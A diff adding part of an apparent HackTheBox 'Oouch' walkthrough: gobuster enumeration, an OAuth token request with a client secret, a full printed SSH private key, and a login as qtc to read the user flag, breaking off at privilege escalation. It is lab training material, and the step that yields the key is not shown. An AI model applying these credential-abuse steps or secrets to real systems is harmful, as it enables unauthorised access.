@@ -162,3 +162,156 @@ Django -> Authorization Server
 ```
 
 
+WebSte Enumeration
+==================
+
+After see in the website, The port `5000` is open, so we will `REGISTER` into account ,And after login we get ooucch   page 
+
+![](/assets/img/posts/oouch/signin.png]
+
+![](/assets/img/posts/oouch/4.png]
+
+
+We Fount Nothing Intresting  There so Go back to `Gobuster` start diging,
+
+```bash
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.177:5000
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/06/08 09:49:48 Starting gobuster
+===============================================================
+/about (Status: 302)
+/contact (Status: 302)
+/documents (Status: 302)
+/home (Status: 302)
+/login (Status: 200)
+/logout (Status: 302)
+/oauth (Status: 302)
+/profile (Status: 302)
+/register (Status: 200)
+===============================================================
+2020/06/08 09:57:39 Finished
+===============================================================
+```
+
+we got `outh`  dir
+
+
+![](/assets/img/posts/oouch/5.png]
+
+
+It reveals a new subdomain `consumer.oouch.htb` so Added it to `/etc/hosts`
+
+When I open [`http://consumer.oouch.htb:5000/oauth/connect`](http://consumer.oouch.htb:5000/oauth/connect), It redirects me to some another subdomain `authorization.oouch.htb:8000` so Added it to my `/etc/hosts`
+
+Once we go back to the connect page, we can authorize the application as follows.
+
+![](/assets/img/posts/oouch/6.png]
+
+after that we will log  as `qtc'
+
+We already got the client_id and client_secret so I can get the access_token.
+
+
+```bash
+root@kali:~/CTF/HTB/Boxes/Oouch# curl -X POST 'http://authorization.oouch.htb:8000/oauth/token/' -H "Content-Type: application/x-www-form-urlencoded" --data "grant_type=client_credentials&client_id=4muao51xk7wSAAMFe970Cr80vQaO8DusCEQW81fG&client_secret=IVehRabE8UzG9EQrzDUCy7gfupOlL15y5RKc10CeWFJT8f9zWjf3CylrUriGwEatsPvjOZyoIfagE1hF4GgKAEV9ETNuZ2N5cUx5kEMWeuTaGVSl89gzPFwoJeEE0vEI" -L -s
+
+{"access_token": "vcvGfw7s9nDlRDedGKFgEOsDfw127H", "expires_in": 600, "token_type": "Bearer", "scope": "read write"}
+```
+
+`SSH Key`
+
+```bash
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+```
+
+Time To Get USER
+=================
+
+After getting Ssh , login in ang get the `User.txt`
+
+```bash
+root@kali:~/CTF/HTB/Boxes/Oouch# chmod 600 id_rsa 
+root@kali:~/CTF/HTB/Boxes/Oouch# ssh -i id_rsa qtc@oouch.htb
+The authenticity of host 'oouch.htb (10.10.10.177)' can't be established.
+ED25519 key fingerprint is SHA256:6/ZyfRrDDz0w1+EniBrf/0LXg5sF4o5jYNEjjU32y8s.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'oouch.htb,10.10.10.177' (ED25519) to the list of known hosts.
+Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3
+qtc@oouch:~$ ls
+user.txt
+qtc@oouch:~$ cat user.txt
+```
+
+Got user.txt
+
+```bash
+qtc@oouch:~$ cat user.txt
+ba7--------------------------d14
+qtc@oouch:~$ 
+```
+
+Privilege escalation
+=====================
+
+Login to docker
+---------------
+
+Tried to running various `monitoring` scripts but no success.
+
+Running `ps -aux` and `ss` gave me some interesting results that there is a docker running on the machine.
+
+I did a command `ip a`.It `Displays info about all network interfaces` and also about the docker and its interfaces related to it.And we got the ip range on which the docker and related service is running
